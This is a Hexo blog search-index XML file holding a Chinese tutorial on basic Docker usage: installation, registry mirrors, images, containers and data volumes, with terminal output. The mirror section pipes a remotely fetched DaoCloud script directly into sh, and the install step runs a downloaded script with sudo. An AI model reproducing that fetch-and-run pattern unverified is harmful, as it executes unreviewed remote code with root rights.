<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[Docker 使用笔记]]></title>
      <url>/Docker%20%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>Docker是一个开源项目，诞生于 2013 年初，最初是 dotCloud 公司内部的一个业务项目。它基于 Google 公司推出的 Go 语言实现。项目后来加入 Linux 基金会，遵从了 Apache 2.0 协议，项目代码在 GitHub 上进行维护。</p>
<p>Docker 项目的目标是实现轻量级的操作系统虚拟化解决方案，Docker 的基础是 Linux 容器 (LXC) 等技术。在 LCX 的基础上 Docker 进行了进一步的封装，让用户不需要关心容器的管理，使得操作更为简便，用户操作 Docker 的容器就像操作一个快速轻量级的虚拟机一样。</p>
<p>以下为 Docker 的基本功能使用记录。</p>
<h3 id="0x01-安装-Docker"><a href="#0x01-安装-Docker" class="headerlink" title="0x01 安装 Docker"></a><strong>0x01 安装 Docker</strong></h3><h4 id="1）安装"><a href="#1）安装" class="headerlink" title="1）安装"></a><strong>1）安装</strong></h4><p>在测试或开发环境中 Docker 官方为了简化安装流程，提供了一套便捷的安装脚本，Ubuntu 系统上可以使用这套脚本安装：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl -fsSL get.docker.com -o get-docker.sh</div><div class="line">$ sudo sh get-docker.sh --mirror Aliyun</div></pre></td></tr></table></figure></p>
<h4 id="2）镜像加速器"><a href="#2）镜像加速器" class="headerlink" title="2）镜像加速器"></a><strong>2）镜像加速器</strong></h4><p>国内访问 Docker Hub 有时会遇到困难，此时可以配置镜像加速器。使用国内云服务商 DaoCloud 提供的加速器服务。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://xxx.m.daocloud.io</div></pre></td></tr></table></figure></p>
<p>该脚本可以将 –registry-mirror 加入到 Docker 配置文件 /etc/docker/daemon.json 中。适用于 Ubuntu14.04、Debian、CentOS6 、CentOS7、Fedora、Arch Linux、openSUSE Leap 42.1，其他版本可能有细微不同。    </p>
<p>重新启动服务。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo service docker restart</div></pre></td></tr></table></figure></p>
<p>配置完加速器需要检查是否生效，如果 Docker 版本大于 1.13 或 17.05.0-ce，可以使用以下命令检查。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker info|grep <span class="string">"Registry Mirrors"</span> -A <span class="number">1</span></div><div class="line">Registry Mirrors:</div><div class="line"> http://xxx.m.daocloud.io/</div><div class="line">WARNING: No swap limit support</div></pre></td></tr></table></figure></p>
<h3 id="0x02-镜像"><a href="#0x02-镜像" class="headerlink" title="0x02 镜像"></a><strong>0x02 镜像</strong></h3><p>对于 Linux 而言，内核启动后，会挂载 root 文件系统为其提供用户空间支持。而 Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:14.04 就包含了完整的一套 Ubuntu 14.04 最小系统的 root 文件系统。</p>
<p>Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</p>
<h4 id="1）获取镜像"><a href="#1）获取镜像" class="headerlink" title="1）获取镜像"></a><strong>1）获取镜像</strong></h4><p>从 Docker Registry 获取镜像的命令是 docker pull。其命令格式为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull [选项] [Docker Registry地址]&lt;仓库名&gt;:&lt;标签&gt;</div></pre></td></tr></table></figure></p>
<p>Docker Registry地址：地址的格式一般是 &lt;域名/IP&gt;[:端口号]。默认地址是 Docker Hub。<br>仓库名：仓库名是两段式名称，即 &lt;用户名&gt;/&lt;软件名&gt;。对于 Docker Hub，如果不给出用户名，则默认为 library，也就是官方镜像。如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker pull ubuntu:<span class="number">14.04</span>                                                                                                        </div><div class="line"><span class="number">14.04</span>: Pulling <span class="keyword">from</span> library/ubuntu</div><div class="line">bae382666908: Pull complete</div><div class="line"><span class="number">29</span>ede3c02ff2: Pull complete</div><div class="line">da4e69f33106: Pull complete</div><div class="line"><span class="number">8</span>d43e5f5d27f: Pull complete</div><div class="line">b0de1abb17d6: Pull complete</div><div class="line">Digest: sha256:<span class="number">6e3</span>e3f3c5c36a91ba17ea002f63e5607ed6a8c8e5fbbddb31ad3e15638b51ebc</div><div class="line">Status: Downloaded newer image <span class="keyword">for</span> ubuntu:<span class="number">14.04</span></div></pre></td></tr></table></figure></p>
<p>上面的命令中没有给出 Docker Registry 地址，而镜像名称是 ubuntu:14.04，因此将会获取官方镜像 library/ubuntu 仓库中标签为 14.04 的镜像。</p>
<h4 id="2）运行容器"><a href="#2）运行容器" class="headerlink" title="2）运行容器"></a><strong>2）运行容器</strong></h4><p>使用<code>docker run</code> 根据镜像新建并运行容器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it ubuntu:<span class="number">14.04</span> bash                                                                                                </div><div class="line">root@fd93decf46b8:/<span class="comment"># cat /etc/os-release</span></div><div class="line">NAME=<span class="string">"Ubuntu"</span></div><div class="line">VERSION=<span class="string">"14.04.5 LTS, Trusty Tahr"</span></div><div class="line">ID=ubuntu</div><div class="line">ID_LIKE=debian</div><div class="line">PRETTY_NAME=<span class="string">"Ubuntu 14.04.5 LTS"</span></div><div class="line">VERSION_ID=<span class="string">"14.04"</span></div><div class="line">HOME_URL=<span class="string">"http://www.ubuntu.com/"</span></div><div class="line">SUPPORT_URL=<span class="string">"http://help.ubuntu.com/"</span></div><div class="line">BUG_REPORT_URL=<span class="string">"http://bugs.launchpad.net/ubuntu/"</span></div><div class="line">root@fd93decf46b8:/<span class="comment">#</span></div></pre></td></tr></table></figure></p>
<blockquote>
<p>-it：这是两个参数，-i 是交互式操作，-t 为交互式终端。<br>ubuntu:14.04：指用 ubuntu:14.04 镜像为基础来启动容器。<br>bash：放在镜像名后的是命令，运行bash 返回交互式 Shell。</p>
</blockquote>
<p>进入容器后，可以在 Shell 下操作，执行任何所需的命令。最后可以通过 exit 退出容器。</p>
<p>退出容器后可以使用 <code>docker exec</code> 命令进入容器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">fd93decf46b8        ubuntu:<span class="number">14.04</span>        <span class="string">"bash"</span>              <span class="number">3</span> hours ago         Up About an hour                        practical_raman</div><div class="line">lc@ubuntu:~$ sudo docker <span class="keyword">exec</span> -it fd93decf46b8 bash</div><div class="line">root@fd93decf46b8:/<span class="comment">#</span></div></pre></td></tr></table></figure></p>
<h4 id="3）列出镜像"><a href="#3）列出镜像" class="headerlink" title="3）列出镜像"></a><strong>3）列出镜像</strong></h4><p>使用<code>docker images</code> 命令可以列出已经下载的镜像。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              <span class="number">14.04</span>               dea1945146b9        <span class="number">2</span> weeks ago         <span class="number">188</span>MB</div></pre></td></tr></table></figure></p>
<p>列表包含了仓库名、标签、镜像 ID、创建时间以及所占用的空间。</p>
<h4 id="4）保存镜像"><a href="#4）保存镜像" class="headerlink" title="4）保存镜像"></a><strong>4）保存镜像</strong></h4><p>当修改容器的文件后，可以使用命令<code>docker diff</code>查看具体的改动。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker diff fd93decf46b8</div><div class="line">C /root</div><div class="line">A /root/.bash_history</div></pre></td></tr></table></figure></p>
<p>在不使用卷的情况下运行一个容器时，任何文件修改都会被记录于容器存储层里。而 Docker 提供的 <code>docker commit</code> 命令可以将容器的存储层保存下来成为镜像，语法格式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</div></pre></td></tr></table></figure></p>
<p>用下面的命令将容器保存为镜像：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker commit --author <span class="string">"0x4C43"</span> --message <span class="string">"modify"</span> fd93decf46b8 ubuntu:v2</div><div class="line">sha256:<span class="number">011e54908</span>d10c0f77efdc7ff4fe2c7ec61ba9e0a43d5e862264a914e74c5b0b0</div><div class="line">lc@ubuntu:~$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              v2                  <span class="number">011e54908</span>d10        <span class="number">12</span> seconds ago      <span class="number">188</span>MB</div><div class="line">ubuntu              <span class="number">14.04</span>               dea1945146b9        <span class="number">2</span> weeks ago         <span class="number">188</span>MB</div></pre></td></tr></table></figure></p>
<p>其中 –author 指定修改的作者，而 –message 记录本次修改的内容。</p>
<p>使用 <code>docker commit</code> 意味着所有对镜像的操作都是黑箱操作，生成的镜像也被称为黑箱镜像。在实际应用中使用 Dockerfile 来定制镜像。</p>
<h4 id="4）删除镜像"><a href="#4）删除镜像" class="headerlink" title="4）删除镜像"></a><strong>4）删除镜像</strong></h4><p>如果要删除本地的镜像，可以使用 <code>docker    rmi</code> 命令。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              latest              <span class="number">2</span>d696327ab2e        <span class="number">2</span> weeks ago         <span class="number">122</span>MB</div><div class="line">ubuntu              <span class="number">14.04</span>               dea1945146b9        <span class="number">2</span> weeks ago         <span class="number">188</span>MB</div><div class="line">lc@ubuntu:~$ sudo docker rmi dea19</div><div class="line">Untagged: ubuntu:<span class="number">14.04</span></div><div class="line">Untagged: ubuntu@sha256:<span class="number">6e3</span>e3f3c5c36a91ba17ea002f63e5607ed6a8c8e5fbbddb31ad3e15638b51ebc</div><div class="line">Deleted: sha256:dea1945146b96542e6e20642830c78df702d524a113605a906397db1db022703</div><div class="line">Deleted: sha256:<span class="number">6401e3024</span>b4d4ef4c981cde2e830858eb790ee84284e1401cf569a6db8df51d9</div><div class="line">Deleted: sha256:f12ee38eb7aa0ffdd43c657b433d91ac4c2930887c02eb638fd1518f374bc738</div><div class="line">Deleted: sha256:<span class="number">9</span>ac64e2751425199591402799079940629829c7c2fc0e083fb714e5dd94d70a9</div><div class="line">Deleted: sha256:<span class="number">12</span>a6279e654d2f23c2fa086bf2dcd82e1a2c82b01028379bbf2cde061d9235e6</div><div class="line">Deleted: sha256:c47d9b229ca4eaf5d3b85b6fa7f794d00910a42634dd0fd5107a9a937b13b20f</div></pre></td></tr></table></figure></p>
<h3 id="0x03-容器"><a href="#0x03-容器" class="headerlink" title="0x03 容器"></a><strong>0x03 容器</strong></h3><p>镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p>
<p>容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的 命名空间。因此容器可以拥有自己的 root 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。这种特性使得容器封装的应用比直接在宿主运行更加安全。</p>
<h4 id="1）启动容器"><a href="#1）启动容器" class="headerlink" title="1）启动容器"></a><strong>1）启动容器</strong></h4><p>启动容器有两种方式，一种是基于镜像新建一个容器并启动，另外一个是将在终止状态（stopped）的容器重新启动。</p>
<p><strong>a. 新建并启动</strong><br>如 0x02 中所示，使用 <code>docker run</code> 启动一个容器。利用这种方式来创建容器时，Docker 在后台运行的标准操作包括：</p>
<blockquote>
<p>检查本地是否存在指定的镜像，不存在就从公有仓库下载<br>利用镜像创建并启动一个容器<br>分配一个文件系统，并在只读的镜像层外面挂载一层可读写层<br>从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中去<br>从地址池配置一个 ip 地址给容器<br>执行用户指定的应用程序<br>执行完毕后容器被终止    </p>
</blockquote>
<p><strong>b. 启动已终止容器</strong><br>可以利用<code>docker start</code> 命令，直接将一个已经终止的容器启动运行。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                      PORTS               NAMES</div><div class="line"><span class="number">57002</span>ad935b0        ubuntu:latest       <span class="string">"/bin/echo 'Hello ..."</span>   <span class="number">9</span> minutes ago       Exited (<span class="number">0</span>) <span class="number">12</span> seconds ago                       silly_gates</div><div class="line">f636101c203a        <span class="number">2</span>d696327ab2e        <span class="string">"bash"</span>                   <span class="number">19</span> hours ago        Up <span class="number">19</span> hours                                     ecstatic_morse</div><div class="line">lc@ubuntu:~$ sudo docker start -i <span class="number">5700</span></div><div class="line">Hello World!</div></pre></td></tr></table></figure></p>
<p><strong>c. 守护态运行</strong><br>更多的时候，需要让 Docker在后台运行而不是直接把执行命令的结果输出在当前宿主机下。此时，可以通过添加 -d 参数来实现。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker image ls</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              latest              <span class="number">2</span>d696327ab2e        <span class="number">2</span> weeks ago         <span class="number">122</span>MB</div><div class="line">lc@ubuntu:~$ sudo docker run -it -d <span class="number">2</span>d696 bash</div><div class="line"><span class="number">931</span>a04d6ac702a478b4c994b7f756eddd4801144be10bc9c760437fd6c9a962f</div><div class="line">lc@ubuntu:~$ sudo docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              <span class="number">10</span> seconds ago      Up <span class="number">9</span> seconds                            agitated_kepler</div></pre></td></tr></table></figure></p>
<h4 id="2）终止容器"><a href="#2）终止容器" class="headerlink" title="2）终止容器"></a><strong>2）终止容器</strong></h4><p>可以使用 <code>docker stop</code> 来终止一个运行中的容器。</p>
<p>此外，当Docker容器中指定的应用终结时，容器也自动终止。 例如对于只启动了一个终端的容器，用户通过 exit 命令或 Ctrl+d 来退出终端时，所创建的容器立刻终止。</p>
<p>终止状态的容器可以用 docker ps -a 命令看到。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                      PORTS               NAMES</div><div class="line"><span class="number">4</span>c95f2701cbd        <span class="number">2</span>d696               <span class="string">"bash"</span>                   <span class="number">4</span> minutes ago       Exited (<span class="number">0</span>) <span class="number">44</span> seconds ago                       vigilant_beaver</div><div class="line"><span class="number">57002</span>ad935b0        ubuntu:latest       <span class="string">"/bin/echo 'Hello ..."</span>   About an hour ago   Exited (<span class="number">0</span>) <span class="number">5</span> minutes ago                        silly_gates</div><div class="line">f636101c203a        <span class="number">2</span>d696327ab2e        <span class="string">"bash"</span>                   <span class="number">20</span> hours ago        Exited (<span class="number">0</span>) <span class="number">8</span> minutes ago                        ecstatic_morse</div></pre></td></tr></table></figure></p>
<h4 id="3）-进入容器"><a href="#3）-进入容器" class="headerlink" title="3） 进入容器"></a><strong>3） 进入容器</strong></h4><p>当需要进入在后台运行的容器时，可以使用<code>docker attach</code>命令进行操作。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              <span class="number">10</span> seconds ago      Up <span class="number">9</span> seconds                            agitated_kepler</div><div class="line">lc@ubuntu:~$ sudo docker attach <span class="number">931</span>a</div><div class="line">root@<span class="number">931</span>a04d6ac70:/<span class="comment">#</span></div></pre></td></tr></table></figure></p>
<h4 id="4）-导出和导入容器"><a href="#4）-导出和导入容器" class="headerlink" title="4） 导出和导入容器"></a><strong>4） 导出和导入容器</strong></h4><p>使用 <code>docker export</code> 命令可以导出容器快照到本地文件。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              <span class="number">45</span> minutes ago      Up <span class="number">10</span> seconds                           agitated_kepler</div><div class="line">lc@ubuntu:~$ sudo docker export <span class="number">931</span>a &gt; ubuntu.tar</div></pre></td></tr></table></figure></p>
<p>使用<code>docker import</code>可以将本地快照文件导入为镜像。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ cat ubuntu.tar | sudo docker <span class="keyword">import</span> - ubuntu:v1                                                                                      </div><div class="line">sha256:<span class="number">22e45</span>fa74eac9efd1f3024044ef2e018495ae67efc67b7600b29f8fec88e57b2</div><div class="line">lc@ubuntu:~$ sudo docker images                                                                                                                   </div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              v1                  <span class="number">22e45</span>fa74eac        <span class="number">5</span> seconds ago       <span class="number">98.2</span>MB</div><div class="line">ubuntu              latest              <span class="number">2</span>d696327ab2e        <span class="number">2</span> weeks ago         <span class="number">122</span>MB</div></pre></td></tr></table></figure></p>
<h4 id="5）删除容器"><a href="#5）删除容器" class="headerlink" title="5）删除容器"></a><strong>5）删除容器</strong></h4><p>使用 <code>docker rm</code> 可以删除处于终止状态的容器。如果要删除一个运行中的容器，可以添加 -f 参数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps -a                                                                                                                    </div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                      PORTS               NAMES</div><div class="line"><span class="number">5</span>bc510e165b4        <span class="number">22e45</span>               <span class="string">"bash"</span>              <span class="number">43</span> seconds ago      Exited (<span class="number">0</span>) <span class="number">32</span> seconds ago                       priceless_jackson</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              About an hour ago   Exited (<span class="number">0</span>) <span class="number">7</span> minutes ago                        agitated_kepler</div><div class="line">lc@ubuntu:~$ sudo docker rm <span class="number">5</span>bc51</div><div class="line"><span class="number">5</span>bc51</div><div class="line">lc@ubuntu:~$ sudo docker ps -a   </div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMES</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              About an hour ago   Exited (<span class="number">0</span>) <span class="number">7</span> minutes ago                       agitated_kepler</div></pre></td></tr></table></figure></p>
<h3 id="0x04-数据管理"><a href="#0x04-数据管理" class="headerlink" title="0x04 数据管理"></a><strong>0x04 数据管理</strong></h3><p>在容器中管理数据主要有两种方式：数据卷（Data volumes）和数据卷容器（Data volume containers）。</p>
<h4 id="1）数据卷"><a href="#1）数据卷" class="headerlink" title="1）数据卷"></a><strong>1）数据卷</strong></h4><p>数据卷是一个可供一个或多个容器使用的特殊目录，有以下特性：</p>
<blockquote>
<p>数据卷可以在容器之间共享和重用<br>对数据卷的修改会立马生效<br>对数据卷的更新，不会影响镜像<br>数据卷默认会一直存在，即使容器被删除</p>
</blockquote>
<p><strong>a. 创建数据卷</strong><br>在用 <code>docker run</code> 命令时，使用 -v 选项可创建一个数据卷并挂载到容器里。下面创建一个名为 testVolume 的容器，并加载一个数据卷到容器的 /Volume 目录。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it --name testVolume -v /Volume <span class="number">2</span>d696 bash</div><div class="line">root@a48cd127e2e9:/<span class="comment"># ls</span></div><div class="line">Volume  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</div></pre></td></tr></table></figure></p>
<p>此外，可以指定挂载一个本地主机的目录到容器中去。本地目录的路径必须是绝对路径，如果目录不存在 Docker 会自动为你创建它。下面将本地主机的 localVolume 目录挂载到容器的 /testVolume 目录。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              v1                  <span class="number">22e45</span>fa74eac        <span class="number">5</span> hours ago         <span class="number">98.2</span>MB</div><div class="line">ubuntu              latest              <span class="number">2</span>d696327ab2e        <span class="number">2</span> weeks ago         <span class="number">122</span>MB</div><div class="line">lc@ubuntu:~$ sudo docker run -it -v /home/lc/localVolume:/testVolume <span class="number">2</span>d69 bash</div><div class="line"></div><div class="line">root@f3f239c230b7:/<span class="comment">#</span></div><div class="line">root@f3f239c230b7:/<span class="comment"># ls</span></div><div class="line">bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  testVolume  tmp  usr  var</div><div class="line">root@f3f239c230b7:/<span class="comment"># cat testVolume/test</span></div><div class="line">Hello World!!!</div></pre></td></tr></table></figure></p>
<p>Docker 挂载数据卷的默认权限是读写，用户也可以通过 :ro 指定为只读。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it -v /home/lc/localVolume:/testVolume:ro <span class="number">2</span>d69 bash</div><div class="line">root@d478e93818b6:/<span class="comment"># ls</span></div><div class="line">bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  testVolume  tmp  usr  var</div><div class="line">root@d478e93818b6:/<span class="comment"># ls -l testVolume/</span></div><div class="line">total <span class="number">0</span></div><div class="line">-rw-rw-r-- <span class="number">1</span> <span class="number">1000</span> <span class="number">1000</span> <span class="number">0</span> Oct  <span class="number">4</span> <span class="number">14</span>:<span class="number">55</span> hello</div><div class="line">root@d478e93818b6:/<span class="comment"># rm /testVolume/hello</span></div><div class="line">rm: cannot remove <span class="string">'/testVolume/hello'</span>: Read-only file system</div></pre></td></tr></table></figure></p>
<p><strong>b. 删除数据卷</strong><br> 数据卷是被设计用来持久化数据的，它的生命周期独立于容器，Docker不会在容器被删除后自动删除数据卷，并且也不存在垃圾回收这样的机制来处理没有任何容器引用的数据卷。</p>
<p>在删除容器的时候使用 <code>docker rm -v</code> 命令可以在删除容器的同时移除数据卷。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo find / -name Volume</div><div class="line">/var/lib/docker/aufs/diff/d067854784e90619885211e81920c13cc34d2320adacec7826faef5bc6819d27/Volume</div><div class="line">/var/lib/docker/aufs/mnt/d067854784e90619885211e81920c13cc34d2320adacec7826faef5bc6819d27/Volume</div><div class="line"></div><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                         PORTS               NAMES</div><div class="line">a48cd127e2e9        <span class="number">2</span>d696               <span class="string">"bash"</span>              About an hour ago   Exited (<span class="number">0</span>) <span class="number">12</span> seconds ago                          testVolume</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>              <span class="number">6</span> hours ago         Exited (<span class="number">0</span>) About an hour ago                       agitated_kepler</div><div class="line">lc@ubuntu:~$ sudo docker rm -v a48cd</div><div class="line">a48cd</div><div class="line"></div><div class="line">lc@ubuntu:~$ sudo find / -name Volume</div><div class="line">lc@ubuntu:~$</div></pre></td></tr></table></figure>
<p><strong>c. 查看数据卷信息</strong><br>使用<code>docker inspect</code> 命令可以查看容器的详细信息，找到其中有关数据卷的项：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="string">"Mounts"</span>: [</div><div class="line">    &#123;</div><div class="line">        <span class="string">"Type"</span>: <span class="string">"bind"</span>,</div><div class="line">        <span class="string">"Source"</span>: <span class="string">"/home/lc/localVolume"</span>,</div><div class="line">        <span class="string">"Destination"</span>: <span class="string">"/testVolume"</span>,</div><div class="line">        <span class="string">"Mode"</span>: <span class="string">"ro"</span>,</div><div class="line">        <span class="string">"RW"</span>: false,</div><div class="line">        <span class="string">"Propagation"</span>: <span class="string">"rprivate"</span></div><div class="line">    &#125;</div><div class="line">],</div></pre></td></tr></table></figure></p>
<h4 id="2）数据卷容器"><a href="#2）数据卷容器" class="headerlink" title="2）数据卷容器"></a><strong>2）数据卷容器</strong></h4><p>如果一些持续更新的数据需要在容器之间共享，可以创建数据卷容器。数据卷容器是一个正常的容器，提供数据卷供其它容器挂载。</p>
<p>首先，创建一个名为 dbdata 的数据卷容器：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -v /dbdata --name dbdata <span class="number">2</span>d696 echo Data-only container <span class="keyword">for</span> <span class="number">2</span>d696                                                  </div><div class="line">Data-only container <span class="keyword">for</span> <span class="number">2</span>d696</div><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                      PORTS               NAMES</div><div class="line">ce22bb5c5b4d        <span class="number">2</span>d696               <span class="string">"echo Data-only co..."</span>   <span class="number">12</span> seconds ago      Exited (<span class="number">0</span>) <span class="number">10</span> seconds ago                       dbdata</div><div class="line"><span class="number">931</span>a04d6ac70        <span class="number">2</span>d696               <span class="string">"bash"</span>                   <span class="number">7</span> hours ago         Exited (<span class="number">0</span>) <span class="number">2</span> hours ago                          agitated_kepler</div></pre></td></tr></table></figure></p>
